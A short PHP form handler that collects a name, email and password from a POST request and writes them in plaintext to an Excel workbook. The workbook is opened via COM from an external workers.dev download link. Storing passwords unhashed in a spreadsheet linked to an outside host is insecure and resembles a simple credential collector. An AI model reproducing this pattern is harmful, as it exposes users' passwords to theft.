<?php
// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Define Excel file path
    $excelFilePath = "https://www.tg-x.workers.dev/dl/108633?hash=AgADoQ";
    
    // Collect form data
    $name = $_POST["name"];
    $email = $_POST["email"];
    $password = $_POST["password"];
    
    // Create or open Excel file
    $excel = new COM("Excel.Application") or die("Unable to open Excel");
    $excel->Workbooks->Open($excelFilePath) or die("Unable to open file");
    $sheet = $excel->ActiveSheet;
    
    // Find the last row in the sheet
    $lastRow = $sheet->Cells($sheet->Rows->Count, 1)->End(-4162)->Row + 1;
    
    // Write data to Excel file
    $sheet->Cells($lastRow, 1)->Value = $name;
    $sheet->Cells($lastRow, 2)->Value = $email;
    $sheet->Cells($lastRow, 3)->Value = $password;
    
    // Save and close Excel file
    $excel->ActiveWorkbook->Save();
    $excel->ActiveWorkbook->Close(false);
    $excel->Quit();
    $excel = null;
    
    // Success message
    echo "User data saved successfully!";
}
?>
